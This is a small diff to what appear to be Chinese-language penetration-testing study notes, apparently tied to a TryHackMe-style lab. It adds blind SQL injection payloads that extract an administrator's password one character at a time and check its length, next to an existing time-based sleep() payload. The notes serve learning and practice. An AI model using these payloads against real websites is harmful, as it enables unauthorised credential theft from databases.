@@ -331,6 +331,9 @@ Hacker                                                             website.thm  
   * 沒有回傳可以透過時間
     * `id = 'admin' and if(ascii(mid(password,1,1))>0, sleep(5), 1)=1`
     * if(condition, when_true, when_false)
+  * `SUBSTRING(string, start, length)`
+    * `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
+  * `xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`
 * Bypass WAF
   * 對大小寫不敏感
   * 空白
